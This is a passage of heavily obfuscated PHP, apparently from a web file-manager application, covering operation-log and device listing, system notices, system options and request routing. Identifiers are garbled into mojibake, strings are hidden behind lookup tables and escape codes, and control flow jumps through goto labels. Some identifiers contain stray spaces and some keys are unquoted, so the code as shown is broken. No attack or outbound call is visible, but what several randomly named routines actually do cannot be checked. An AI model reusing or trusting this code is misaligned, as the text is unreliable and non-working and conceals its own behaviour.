($D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[29]]) { $f‡±İÌÁàÓ = explode($CÅéÀàŒ™Œ[47], $D˜«½ƒ„ğß[$CÅéÀàŒ™Œ[29]]); $b²ÚšÉõÍ™ = $this->typeFile(); $EÓ†Ü½¦ôİ = array(); foreach ($f‡±İÌÁàÓ as $b¹‹½ÜÛËŸ) { $EÓ†Ü½¦ôİ[] = $b¹‹½ÜÛËŸ; if (isset($b²ÚšÉõÍ™[$b¹‹½ÜÛËŸ])) { $EÓ†Ü½¦ôİ = array_merge($EÓ†Ü½¦ôİ, $b²ÚšÉõÍ™[$b¹‹½ÜÛËŸ]); } } $EÓ†Ü½¦ôİ = array_unique($EÓ†Ü½¦ôİ); if ($EÓ†Ü½¦ôİ) { $BÜŞÀƒˆÃ[$CÅéÀàŒ™Œ[29]] = array($CÅéÀàŒ™Œ[7], $EÓ†Ü½¦ôİ); } } goto DÏé”è¬„; C ÈÌ Øëí: } private function ipAddress(&$dİ¬È»İù) { $aÈ¡íä¬¢ =& $_SERVER[‘®…¢À]; if (!empty($dİ¬È»İù[$aÈ¡íä¬¢[2334]])) { $bÛ©é‰…Ê = IpLocation::get($dİ¬È»İù[$aÈ¡íä¬¢[2334]]); if ($bÛ©é‰…Ê == $aÈ¡íä¬¢[2335]) { $bÛ©é‰…Ê = $aÈ¡íä¬¢[2336]; } } else { $bÛ©é‰…Ê = LNG($aÈ¡íä¬¢[2337]); } $dİ¬È»İù[$aÈ¡íä¬¢[2338]] = $bÛ©é‰…Ê; } private function getSourceList(&$BŒõ²…å) { $eß²İğóÀ =& $_SERVER[‘®…¢À]; $AŞæßÍ¢Èâ = array(); foreach ($BŒõ²…å as $FÏÕ÷öªÀÂ => $aøÎš¡¸×æ) { $AàíÀï“ñ‹ = json_decode($aøÎš¡¸×æ[$eß²İğóÀ[400]], !0); if (strpos($aøÎš¡¸×æ[$eß²İğóÀ[29]], $eß²İğóÀ[2171]) !== 0) { goto a„ÉĞç‘‹‚; F¿çÂïŒ„÷: continue; goto b¨•Ó…ÆÈÃ; f§š†âÕÃó: $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[365]] = $AôÀ«ÌÛÌ[$eß²İğóÀ[365]]; $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[2170]] = $AôÀ«ÌÛÌ[$eß²İğóÀ[456]]; $BŒõ²…å[$FÏÕ÷öªÀÂ][$eß²İğóÀ[400]] = json_encode($AàíÀï“ñ‹); goto F¿çÂïŒ„÷; a„ÉĞç‘‹‚: if (!isset($AàíÀï“ñ‹[$eß²İğóÀ[76]]) || strpos($aøÎš¡¸×æ[$eß²İğóÀ[29]], $eß²İğóÀ[2339]) !== 0) { continue; } if (!IO::init($AàíÀï“ñ‹[$eß²İğóÀ[76]])) { continue; } if (!($AôÀ«ÌÛÌ = IO::infoFull($AàíÀï“ñ‹[$eß²İğóÀ[76]]))) { continue; } goto f§š†âÕÃó; b¨•Ó…ÆÈÃ: } $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[365]]; $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[2170]]; if ($AàíÀï“ñ‹[$eß²İğóÀ[29]] == $eß²İğóÀ[483]) { $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[400]][$eß²İğóÀ[963]]; $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[400]][$eß²İğóÀ[964]]; } if ($AàíÀï“ñ‹[$eß²İğóÀ[29]] == $eß²İğóÀ[2178]) { $AŞæßÍ¢Èâ[] = $AàíÀï“ñ‹[$eß²İğóÀ[400]][$eß²İğóÀ[365]]; } } if (!$AŞæßÍ¢Èâ) { return array(); } return Model($eß²İğóÀ[735])->sourceListInfo($AŞæßÍ¢Èâ, !0); } private function logList($C‚¿¯éºå«) { goto CÇ¥ôÚ“‚ï; cÀáÔİŸÁÜ: $A¾Õ·Ú«Ü = $this->getSourceList($C‚¿¯éºå«); $DÇœ…–´ñ‚ = $this->typeAll(); $f˜…ãÉ”à = array(); goto A™ù‘‚Ïù; A™ù‘‚Ïù: $c°çñÌÒÓ = array(); foreach ($C‚¿¯éºå« as $AÌîÔÃ†Š => $d¢ÛÌÅÆ¾Ô) { goto fˆ©³‹¡À; fˆ©³‹¡À: $Fùéï”ÎÀ = $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[29]]; $a¯Î¼†™ê = isset($A‚Œ¥Œ¡è[$d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[1337]]]) ? $A‚Œ¥Œ¡è[$d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[1337]]] : !1; $DªöÍñÃ¶š = strpos($Fùéï”ÎÀ, $d‚êöö‘†é[2340]) == 0 ? LNG($d‚êöö‘†é[2341]) : LNG($d‚êöö‘†é[2337]); goto fâµ·õä‰; DÃ¢ˆ½ë¯Ş: $this->ipAddress($d¢ÛÌÅÆ¾Ô); if (strpos($Fùéï”ÎÀ, $d‚êöö‘†é[2171]) === 0 || isset($BÕÒÑ‰ò¿•[$d‚êöö‘†é[2170]])) { goto dêˆ„¾¼ï³; dêˆ„¾¼ï³: $BÕÒÑ‰ò¿•[$d‚êöö‘†é[387]] = $A¾Õ·Ú«Ü[$BÕÒÑ‰ò¿•[$d‚êöö‘†é[365]]]; $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2183]] = $A¾Õ·Ú«Ü[$BÕÒÑ‰ò¿•[$d‚êöö‘†é[2170]]]; if ($BÕÒÑ‰ò¿•[$d‚êöö‘†é[29]] == $d‚êöö‘†é[483]) { $BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[963]] = $A¾Õ·Ú«Ü[$BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[963]]]; $BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[964]] = $A¾Õ·Ú«Ü[$BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[964]]]; } goto B“±â˜ùÎÑ; B“±â˜ùÎÑ: if ($BÕÒÑ‰ò¿•[$d‚êöö‘†é[29]] == $d‚êöö‘†é[2178]) { $BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[365]] = $A¾Õ·Ú«Ü[$BÕÒÑ‰ò¿•[$d‚êöö‘†é[400]][$d‚êöö‘†é[365]]]; } if ($BÕÒÑ‰ò¿•[$d‚êöö‘†é[29]] == $d‚êöö‘†é[1968]) { $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2183]] = $BÕÒÑ‰ò¿•[$d‚êöö‘†é[387]]; $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2170]] = $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2183]][$d‚êöö‘†é[365]]; $BÕÒÑ‰ò¿•[$d‚êöö‘†é[387]] = !1; $BÕÒÑ‰ò¿•[$d‚êöö‘†é[365]] = $d‚êöö‘†é[33]; } if ($BÕÒÑ‰ò¿•[$d‚êöö‘†é[387]] && $BÕÒÑ‰ò¿•[$d‚êöö‘†é[387]][$d‚êöö‘†é[367]] == $d‚êöö‘†é[1037]) { $c°çñÌÒÓ[] = $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[363]]; unset($C‚¿¯éºå«[$AÌîÔÃ†Š]); continue; } goto d·«Ş¬²¯; d·«Ş¬²¯: if ($BÕÒÑ‰ò¿•[$d‚êöö‘†é[2183]] && $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2183]][$d‚êöö‘†é[367]] == $d‚êöö‘†é[1037]) { $c°çñÌÒÓ[] = $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[363]]; unset($C‚¿¯éºå«[$AÌîÔÃ†Š]); continue; } goto C¼ªˆø¿™; C¼ªˆø¿™: } $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[400]] = $BÕÒÑ‰ò¿•; goto EÂ¦¹¼¸; fâµ·õä‰: $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[28]] = isset($a¯Î¼†™ê[$d‚êöö‘†é[28]]) ? $a¯Î¼†™ê[$d‚êöö‘†é[28]] : LNG($d‚êöö‘†é[2337]); $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[2218]] = isset($a¯Î¼†™ê[$d‚êöö‘†é[2218]]) ? $a¯Î¼†™ê[$d‚êöö‘†é[2218]] : $d‚êöö‘†é[33]; $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[1234]] = isset($DÇœ…–´ñ‚[$Fùéï”ÎÀ]) ? $DÇœ…–´ñ‚[$Fùéï”ÎÀ] : $DªöÍñÃ¶š; goto Dˆïù¡ƒˆ‰; EÂ¦¹¼¸: unset($d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[2342]]); $f˜…ãÉ”à[] = $d¢ÛÌÅÆ¾Ô; goto D‘ºêáâÑá; Dˆïù¡ƒˆ‰: $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[2135]] = $a¯Î¼†™ê; $BÕÒÑ‰ò¿• = json_decode($d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[400]], !0); $d¢ÛÌÅÆ¾Ô[$d‚êöö‘†é[2334]] = isset($BÕÒÑ‰ò¿•[$d‚êöö‘†é[2334]]) ? $BÕÒÑ‰ò¿•[$d‚êöö‘†é[2334]] : $d‚êöö‘†é[33]; goto DÃ¢ˆ½ë¯Ş; D‘ºêáâÑá: } $this->clearSystemPathLog($c°çñÌÒÓ); goto DÖĞšìØšà; CÇ¥ôÚ“‚ï: $d‚êöö‘†é =& $_SERVER[‘®…¢À]; $FäÉµ”¤˜î = array_to_keyvalue($C‚¿¯éºå«, $d‚êöö‘†é[33], $d‚êöö‘†é[1337]); $A‚Œ¥Œ¡è = Model($d‚êöö‘†é[468])->userListInfo(array_unique($FäÉµ”¤˜î)); goto cÀáÔİŸÁÜ; DÖĞšìØšà: return $f˜…ãÉ”à; goto EôõÈê«ÑÍ; EôõÈê«ÑÍ: } private function clearSystemPathLog($FØáŸÛåİ…) { $eŞÃ™Ü§˜¾ =& $_SERVER[‘®…¢À]; if (count($FØáŸÛåİ…) == 0) { return; } $E¨¯ˆ¸ØóØ = array($eŞÃ™Ü§˜¾[363] => array($eŞÃ™Ü§˜¾[7], array_unique($FØáŸÛåİ…))); $this->where($E¨¯ˆ¸ØóØ)->delete(); } public function deviceList($b•¥´Á–ì, $bï–İš‹ùÂ = 0) { $e‡àáùïğ· =& $_SERVER[‘®…¢À]; $B¿Ïßš‰Ç = array($e‡àáùïğ·[1337] => $b•¥´Á–ì, $e‡àáùïğ·[184] => array($e‡àáùïğ·[909], $bï–İš‹ùÂ), $e‡àáùïğ·[29] => $e‡àáùïğ·[1941]); $b¸ù°İÓÒ„ = array(); $dÖÍ¼È°ğ = $this->field($e‡àáùïğ·[2343])->where($B¿Ïßš‰Ç)->order($e‡àáùïğ·[2181])->select(); foreach ($dÖÍ¼È°ğ as $aˆË÷½ê–İ => $Cõµµ‰ÈøĞ) { goto cõá°‹‹¼‰; A‡À¬†¿: $this->ipAddress($Cõµµ‰ÈøĞ); $Cõµµ‰ÈøĞ[$e‡àáùïğ·[400]] = $AÁµÖÈïÛ; $b¸ù°İÓÒ„[$E»“íš„ëÖ] = $Cõµµ‰ÈøĞ; goto B¿âõÙñô; cõá°‹‹¼‰: if ($aˆË÷½ê–İ > 0 && abs($Cõµµ‰ÈøĞ[$e‡àáùïğ·[184]] - $dÖÍ¼È°ğ[$aˆË÷½ê–İ - 1][$e‡àáùïğ·[184]]) < 5) { continue; } $AÁµÖÈïÛ = json_decode($Cõµµ‰ÈøĞ[$e‡àáùïğ·[400]], !0); $Cõµµ‰ÈøĞ[$e‡àáùïğ·[2334]] = isset($AÁµÖÈïÛ[$e‡àáùïğ·[2334]]) ? $AÁµÖÈïÛ[$e‡àáùïğ·[2334]] : $e‡àáùïğ·[33]; goto BÒ§ğ™®šø; BÒ§ğ™®šø: unset($AÁµÖÈïÛ[$e‡àáùïğ·[2334]]); $E»“íš„ëÖ = $this->deviceType($AÁµÖÈïÛ[$e‡àáùïğ·[2172]]); if (isset($b¸ù°İÓÒ„[$E»“íš„ëÖ])) { continue; } goto A‡À¬†¿; B¿âõÙñô: } return array_values($b¸ù°İÓÒ„); } public function deviceType($FÍóĞÆ×¦Š) { return $FÍóĞÆ×¦Š; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\156\157\164\x69\x63\x65\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x63\x6f\156\164\145\156\164", "\x61\165\164\150", "\155\157\144\145", "\164\151\155\x65", "\164\x79\160\145", "\x73\157\162\x74"); public function listData($Dº¦ÒÓÓô = false, $B¡–¨½Œ· = "\x73\157\x72\x74", $Côá¡”İŒ = false) { return parent::listData($Dº¦ÒÓÓô, $B¡–¨½Œ·, $Côá¡”İŒ); } public function add($aÁ‹æßõóŞ) { goto Aˆöõà‚µë; cŠ¢Ü£ÓóÄ: $C•¹ÔÒÈ‡ = time(); if ($aÁ‹æßõóŞ[$Bš³§È‰‹Ô[12]] == $Bš³§È‰‹Ô[2344]) { $C•¹ÔÒÈ‡ = strtotime($aÁ‹æßõóŞ[$Bš³§È‰‹Ô[187]]); } $aÁ‹æßõóŞ[$Bš³§È‰‹Ô[187]] = $C•¹ÔÒÈ‡; goto F‘ÇÌ…; F‘ÇÌ…: return parent::insert($aÁ‹æßõóŞ); goto FšçİÓò; Aˆöõà‚µë: $Bš³§È‰‹Ô =& $_SERVER[‘®…¢À]; $F÷Ÿµ¼“éø = $this->findByName($aÁ‹æßõóŞ[$Bš³§È‰‹Ô[28]]); if ($F÷Ÿµ¼“éø) { return !1; } goto cŠ¢Ü£ÓóÄ; FšçİÓò: } public function update($b±šõŠÌ¹ó, $eÅæ¿Ò£Æ‰) { goto ağøó¿Ïê; d¨Ö½½Œì‘: $eÅæ¿Ò£Æ‰[$e‚•Ş¥‰[187]] = $c®Òä®Š¾Ë; return parent::update($b±šõŠÌ¹ó, $eÅæ¿Ò£Æ‰); goto føÍìñÁ‚‹; ağøó¿Ïê: $e‚•Ş¥‰ =& $_SERVER[‘®…¢À]; $aîè‚ËÚÓ = $this->listData($b±šõŠÌ¹ó); $e±«Æ‚ã»ô = $this->findByName($eÅæ¿Ò£Æ‰[$e‚•Ş¥‰[28]]); goto C·ì¿ä ò; C·ì¿ä ò: if (!$aîè‚ËÚÓ || $e±«Æ‚ã»ô && $e±«Æ‚ã»ô[$e‚•Ş¥‰[363]] != $aîè‚ËÚÓ[$e‚•Ş¥‰[363]]) { return !1; } $c®Òä®Š¾Ë = time(); if ($eÅæ¿Ò£Æ‰[$e‚•Ş¥‰[12]] == $e‚•Ş¥‰[2344]) { $c®Òä®Š¾Ë = strtotime($eÅæ¿Ò£Æ‰[$e‚•Ş¥‰[187]]); } goto d¨Ö½½Œì‘; føÍìñÁ‚‹: } public function remove($b‰Æ’î‰ÉÇ) { $Dİ²¾ÂÁ½ = $this->listData($b‰Æ’î‰ÉÇ); if (!$Dİ²¾ÂÁ½ || $Dİ²¾ÂÁ½[$_SERVER[‘®…¢À][1037]]) { return !1; } return parent::remove($b‰Æ’î‰ÉÇ); } public function sort($aœ‹òìá˜, $B‡È´ğÔœÒ) { return parent::update($aœ‹òìá˜, $B‡È´ğÔœÒ); } private function initUserOption() { $b‘‹±éøªå =& $_SERVER[‘®…¢À]; $this->optionType = $b‘‹±éøªå[2345]; $this->modelType = $b‘‹±éøªå[2346]; $this->field = array($b‘‹±éøªå[2347], $b‘‹±éøªå[28], $b‘‹±éøªå[187], $b‘‹±éøªå[29], $b‘‹±éøªå[662], $b‘‹±éøªå[180]); } public function userNoticeGet($fÆã¾Ä­² = false) { $this->initUserOption(); return parent::listData($fÆã¾Ä­², $_SERVER[‘®…¢À][363], !0); } public function userNoticeAdd($dëë‚è‚»‹) { $E‘è¡êäÎª =& $_SERVER[‘®…¢À]; $this->initUserOption(); $a‹è´Š„® = $this->findByKey($E‘è¡êäÎª[2347], $dëë‚è‚»‹[$E‘è¡êäÎª[363]]); if ($a‹è´Š„®) { return !0; } $f¨à³ôİÎò = array($E‘è¡êäÎª[2347] => $dëë‚è‚»‹[$E‘è¡êäÎª[363]], $E‘è¡êäÎª[28] => $dëë‚è‚»‹[$E‘è¡êäÎª[28]], $E‘è¡êäÎª[187] => $dëë‚è‚»‹[$E‘è¡êäÎª[187]], $E‘è¡êäÎª[29] => isset($dëë‚è‚»‹[$E‘è¡êäÎª[29]]) ? $dëë‚è‚»‹[$E‘è¡êäÎª[29]] : 1, $E‘è¡êäÎª[662] => 0, $E‘è¡êäÎª[180] => 0); return parent::insert($f¨à³ôİÎò); } public function userNoticeEdit($b¥’Í¾Üê, $e÷íÁÍ›Ö‡) { $this->initUserOption(); return parent::update($b¥’Í¾Üê, $e÷íÁÍ›Ö‡); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\155\137\x6f\160\x74\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\165", "\x72\157\154\145", "\162\x6f\154\x65\x47\162\157\165\160", "\162\x65\147\151\x73\x74", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($bÖ»·ÏçØÓ) { return "\x53\x79\x73\x74\x65\155\x4f\x70\164\x69\157\x6e\137{$bÖ»·ÏçØÓ}"; } protected function optionDefault($f•Éø§Î‚ = '') { $CìÀç‡ä¯¢ =& $_SERVER[‘®…¢À]; if ($f•Éø§Î‚ == $CìÀç‡ä¯¢[33]) { return $GLOBALS[$CìÀç‡ä¯¢[6]][$CìÀç‡ä¯¢[2348]]; } } } goto F¥Ø“»Ì¨®; b¹¬†òãŠ: $BªÄ¡Ø¨ = $_SERVER[‘®…¢À][542]; if (!$BªÄ¡Ø¨) { return; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\156\144\x65\170"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($fè½íƒÅÎ) { goto FôÑ™Ñîõ÷; c±ì‰á›°: $this->defaultController = $b¥ùñßä‚[1] ? $b¥ùñßä‚[1] : $this->defaultController; $this->defaultAction = $b¥ùñßä‚[2] ? $b¥ùñßä‚[2] : $this->defaultAction; $this->{$_SERVER[Ş›][3]}($AåºŸã‹İï[4], array($this, $AåºŸã‹İï[5])); goto BèãäÄƒ¹; E–ƒŠ‘˜ë: $eä›ãã–×Ô = $CŒ‰¦°…§÷[543]; while ($eä›ãã–×Ô < $CŒ‰¦°…§÷[544]) { if ($eä›ãã–×Ô >= 0) { break; } $eä›ãã–×Ô++; } $this->defaultModule = $b¥ùñßä‚[0] ? $b¥ùñßä‚[0] : $this->defaultModule; goto c±ì‰á›°; FôÑ™Ñîõ÷: $CŒ‰¦°…§÷ =& $_SERVER[‘®…¢À]; $AåºŸã‹İï =& $_SERVER[Ş›]; $b¥ùñßä‚ = $AåºŸã‹İï[0]($AåºŸã‹İï[1], $AåºŸã‹İï[2]($fè½íƒÅÎ, $AåºŸã‹İï[1])); goto E–ƒŠ‘˜ë; BèãäÄƒ¹: } public function appRun($FêÄùÖ”µ) { goto d¾â‘´µ³Ğ; d¾â‘´µ³Ğ: $BŞ‹ïÁï =& $_SERVER[Ş›]; $cæ­‚–ÄØö = $BŞ‹ïÁï[0]($BŞ‹ïÁï[1], $FêÄùÖ”µ); $e¨â¨ãª‹ = $BŞ‹ïÁï[6]($cæ­‚–ÄØö[0]); goto C³…ùàÌó; C³…ùàÌó: $CœÅ©”„ˆˆ = $BŞ‹ïÁï[7]; if ($e¨â¨ãª‹ == $BŞ‹ïÁï[8]) { $CœÅ©”„ˆˆ = $BŞ‹ïÁï[9]; $cæ­‚–ÄØö[0] = $BŞ‹ïÁï[10]; $cæ­‚–ÄØö[1] = $cæ­‚–ÄØö[1] . $BŞ‹ïÁï[11]; $FêÄùÖ”µ = $BŞ‹ïÁï[12]($BŞ‹ïÁï[1], $cæ­‚–ÄØö); $FêÄùÖ”µ = $BŞ‹ïÁï[2]($FêÄùÖ”µ, $BŞ‹ïÁï[1]); } $BŞ‹ïÁï[13](array($BŞ‹ïÁï[14], $BŞ‹ïÁï[15]), $CœÅ©”„ˆˆ . $BŞ‹ïÁï[16], $FêÄùÖ”µ); goto EÆæ½¬¹µí; EÆæ½¬¹µí: $BŞ‹ïÁï[17]($FêÄùÖ”µ); $BŞ‹ïÁï[13](array($BŞ‹ïÁï[14], $BŞ‹ïÁï[15]), $CœÅ©”„ˆˆ . $BŞ‹ïÁï[18], $FêÄùÖ”µ); goto eĞ…Š‡Ó“; eĞ…Š‡Ó“: } private function autorun() { goto dÕ¿»¦Ù²ê; eß†âÃªÉ÷: $cğ®ë¤òÚÄ = $AÓØ·…Ğª[545]; if (!$cğ®ë¤òÚÄ) { die; } if ($CÇæ¸ïËìï[19]($config[$CÇæ¸ïËìï[20]]) == 0) { return; } goto f¼¹Ûª¤ˆ; dÕ¿»¦Ù²ê: $AÓØ·…Ğª =& $_SERVER[‘®…¢À]; $CÇæ¸ïËìï =& $_SERVER[Ş›]; global $config; goto eß†âÃªÉ÷; f¼¹Ûª¤ˆ: foreach ($config[$CÇæ¸ïËìï[20]] as $BãŞ°É²¿à => $F‚‹½®‡…) { $this->{$_SERVER[Ş›][21]}($F‚‹½®‡…); $eïÕ¶Š¦ø¹ = $AÓØ·…Ğª[546]; } goto Aé‚å«¢²É; Aé‚å«¢²É: } private function xqvt669cf524() { goto C®¡Ò·œç ; b˜Ã½ƒ‚: $GLOBALS[$b ÍÒŞ÷ìé[22]][$b ÍÒŞ÷ìé[28]] = $b ÍÒŞ÷ìé[29]($b ÍÒŞ÷ìé[1], $GLOBALS[$b ÍÒŞ÷ìé[22]][$b ÍÒŞ÷ìé[23]]); goto E÷ƒ’¿‘¢â; aÀèš°ªŠÑ: $b³Ñ©ÛÏØÕ = $GLOBALS[$b ÍÒŞ÷ìé[22]][$b ÍÒŞ÷ìé[23]][0]; $a–‡ª„Õ‘Ì = $EÀãŸŠŞ­™[547]; if (strlen($a–‡ª„Õ‘Ì) < $EÀãŸŠŞ­™[548]) { die; } goto bŸª’Í½¥œ; bŸª’Í½¥œ: if (!$b³Ñ©ÛÏØÕ || $b ÍÒŞ÷ìé[24]($b³Ñ©ÛÏØÕ) <= $b ÍÒŞ÷ìé[24]($fƒå£Ê«œ)) { return; } if ($b ÍÒŞ÷ìé[6]($b ÍÒŞ÷ìé[25]($b³Ñ©ÛÏØÕ, -$b ÍÒŞ÷ìé[24]($fƒå£Ê«œ))) != $fƒå£Ê«œ) { return; } $bÈ¸ĞšÄŸİ = $b ÍÒŞ÷ìé[25]($b³Ñ©ÛÏØÕ, 0, -$b ÍÒŞ÷ìé[24]($fƒå£Ê«œ)); goto aÅˆáËÊî; C®¡Ò·œç : $EÀãŸŠŞ­™ =& $_SERVER[‘®…¢À]; $b ÍÒŞ÷ìé =& $_SERVER[Ş›]; $fƒå£Ê«œ = $b ÍÒŞ÷ìé[8]; goto aÀèš°ªŠÑ; aÅˆáËÊî: $aÈÆÊÄš‚Ä = array($b ÍÒŞ÷ìé[8], $bÈ¸ĞšÄŸİ); $cæÃ°«Å½½ = $b ÍÒŞ÷ìé[26]($GLOBALS[$b ÍÒŞ÷ìé[22]][$b ÍÒŞ÷ìé[23]], 1); $GLOBALS[$b ÍÒŞ÷ìé[22]][$b ÍÒŞ÷ìé[23]] = $b ÍÒŞ÷ìé[27]($aÈÆÊÄš‚Ä, $cæÃ°«Å½½); goto b˜Ã½ƒ‚; E÷ƒ’¿‘¢â: } private function asmd7d2497a3() { goto c‹Ê‹Û¬‰ê; fÎáª•°‚á: $d–¶æ—´„¥ = $_SERVER[$B¤›¬áÒŠğ[30]]; $aÅòÒ³ª÷ = $B¤›¬áÒŠğ[31]; if (!$B¤›¬áÒŠğ[32]($d–¶æ—´„¥, $aÅòÒ³ª÷)) { return; } goto AÔÅˆ‹…ˆÃ; cÎĞŒ¼ì†¸: $GLOBALS[$B¤›¬áÒŠğ[22]][$B¤›¬áÒŠğ[23]] = $B¤›¬áÒŠğ[0]($B¤›¬áÒŠğ[36], $aÃ»ÀŠí); $GLOBALS[$B¤›¬áÒŠğ[22]][$B¤›¬áÒŠğ[28]] = $B¤›¬áÒŠğ[29]($B¤›¬áÒŠğ[1], $GLOBALS[$B¤›¬áÒŠğ[22]][$B¤›¬áÒŠğ[23]]); $EØöäÚè™‘ = $aì¿Ïî•Ò[550]; goto AÆ²Åší‰…; AÔÅˆ‹…ˆÃ: $d ‰·ÈŠ‘ª = $B¤›¬áÒŠğ[33]($d–¶æ—´„¥, $aÅòÒ³ª÷); $aÃ»ÀŠí = $B¤›¬áÒŠğ[25]($d–¶æ—´„¥, $d ‰·ÈŠ‘ª + $B¤›¬áÒŠğ[24]($aÅòÒ³ª÷)); $B¤›¬áÒŠğ[34]($B¤›¬áÒŠğ[35], $aÃ»ÀŠí, $f¾ä£Ôß…); goto CÛ†ÇóÇé; c‹Ê‹Û¬‰ê: $aì¿Ïî•Ò =& $_SERVER[‘®…¢À]; $B¤›¬áÒŠğ =& $_SERVER[Ş›]; if ($GLOBALS[$B¤›¬áÒŠğ[22]][$B¤›¬áÒŠğ[28]] != $B¤›¬áÒŠğ[10]) { return; } goto fÎáª•°‚á; CÛ†ÇóÇé: $CêÎÁÄ = $aì¿Ïî•Ò[549]; if (!$CêÎÁÄ) { return; } $aÃ»ÀŠí = $B¤›¬áÒŠğ[2]($f¾ä£Ôß…[0][0], $B¤›¬áÒŠğ[36]); goto cÎĞŒ¼ì†¸; AÆ²Åší‰…: if (!$EØöäÚè™‘) { die; } goto D×êÚ™°ä§; D×êÚ™°ä§: } public function run() { goto A»ŠŒÖ’Ù; EÎîàôùéŞ: $this->{$_SERVER[Ş›][45]}(); $A¯”‰´Â›Ä = $A÷Û„¸Ü…ß[559]; while ($A¯”‰´Â›Ä < $A÷Û„¸Ü…ß[548]) { if ($A¯”‰´Â›Ä >= 0) { break; } $A¯”‰´Â›Ä++; } goto d­ÃÏä‚; eáÉŒÀÛÙ: $døëéÕÎ•ô = $A÷Û„¸Ü…ß[551]; if (!$døëéÕÎ•ô) { die; } $this->{$_SERVER[Ş›][38]}(); goto dÈéÅÄŒ; A»ŠŒÖ’Ù: $A÷Û„¸Ü…ß =& $_SERVER[‘®…¢À]; $CöÃöÒƒºŠ =& $_SERVER[Ş›]; $this->{$_SERVER[Ş›][37]}(); goto eáÉŒÀÛÙ; BµÔó·Ò¥œ: $BÃ‹¡±Ë½ğ = $A÷Û„¸Ü…ß[553]; while (strlen($BÃ‹¡±Ë½ğ) < $A÷Û„¸Ü…ß[554]) { if (!$BÃ‹¡±Ë½ğ) { break; } $BÃ‹¡±Ë½ğ++; } $CšÂÉÉƒ¬† = $GLOBALS[$CöÃöÒƒºŠ[22]][$CöÃöÒƒºŠ[28]]; goto bõôÂê©; dÈéÅÄŒ: $Bïù‚°¥œ´ = $A÷Û„¸Ü…ß[552]; if (!$Bïù‚°¥œ´) { return; } $b¿ÎŠ…ÆÈ³ = $GLOBALS[$CöÃöÒƒºŠ[22]][$CöÃöÒƒºŠ[23]]; goto BµÔó·Ò¥œ; d­ÃÏä‚: if ($CöÃöÒƒºŠ[19]($b¿ÎŠ…ÆÈ³) >= 3) { $this->{$_SERVER[Ş›][21]}($CšÂÉÉƒ¬†); } else { $this->{$_SERVER[Ş›][21]}(ACTION); } goto A•Ÿ¯œ‡Ñ; bõôÂê©: $CöÃöÒƒºŠ[39]($CöÃöÒƒºŠ[40], isset($b¿ÎŠ…ÆÈ³[0]) && $b¿ÎŠ…ÆÈ³[0] ? $b¿ÎŠ…ÆÈ³[0] : $this->defaultModule); $DºÒôˆ±Ğ = $A÷Û„¸Ü…ß[555]; if (!$DºÒôˆ±Ğ) { return; } goto E Òî»¥±â; E Òî»¥±â: $CöÃöÒƒºŠ[39]($CöÃöÒƒºŠ[41], isset($b¿ÎŠ…ÆÈ³[1]) && $b¿ÎŠ…ÆÈ³[0] ? $b¿ÎŠ…ÆÈ³[1] : $this->defaultController); $b¾×ŒÀöÙ = $A÷Û„¸Ü…ß[556]; if (!$b¾×ŒÀöÙ) { return; } goto cŸ¿‡ÇŠ¸„; cŸ¿‡ÇŠ¸„: $CöÃöÒƒºŠ[39]($CöÃöÒƒºŠ[42], isset($b¿ÎŠ…ÆÈ³[2]) && $b¿ÎŠ…ÆÈ³[0] ? $b¿ÎŠ…ÆÈ³[2] : $this->defaultAction); $EÍ×´‘ØÏÉ = $A÷Û„¸Ü…ß[557]; $CöÃöÒƒºŠ[39]($CöÃöÒƒºŠ[43], MOD . $CöÃöÒƒºŠ[1] . ST . $CöÃöÒƒºŠ[1] . ACT); goto Eí½Ò“¹à; Eí½Ò“¹à: $C×™•äñØ = $A÷Û„¸Ü…ß[558]; if (!$C×™•äñØ) { die; } $_SERVER[$CöÃöÒƒºŠ[44]] = $CöÃöÒƒºŠ[6](ACTION); goto EÎîàôùéŞ; A•Ÿ¯œ‡Ñ: } private $lbsc5e85e8e4 = array(); private $azntf8ec4bca = ''; public function rktm397a0085() { goto EËÓêˆŒÕİ; EËÓêˆŒÕİ: $AŒ©ùŞºï‘ =& $_SERVER[‘®…¢À]; $Dâ´‘ÊŞ =& $_SERVER[Ş›]; $this->{$_SERVER[Ş›][46]}(); goto f±™Â­ »á; cÈ¨³¶ÍÈÂ: if (strlen($D´»ÙÍ‹‚) < $AŒ©ùŞºï‘[564]) { return; } 